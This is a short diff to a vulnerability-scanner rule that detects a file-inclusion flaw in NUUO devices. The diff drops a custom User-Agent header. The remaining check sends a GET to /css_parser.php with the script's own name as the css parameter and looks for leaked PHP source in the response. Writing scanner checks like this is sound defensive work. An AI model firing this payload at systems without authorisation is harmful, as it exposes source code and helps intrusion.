@@ -2,9 +2,5 @@ name: poc-NUUO-FileInclusion
 rules:
   - method: GET
     path: /css_parser.php?css=css_parser.php
-    headers:
-      User-Agent: >-
-        Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like
-        Gecko) Chrome/60.0.3112.114 Safari/537.36
     follow_redirects: false
     expression: status == 200 && headers['content-type'] == 'text/css' && body.bcontains(b"$_GET['css']")
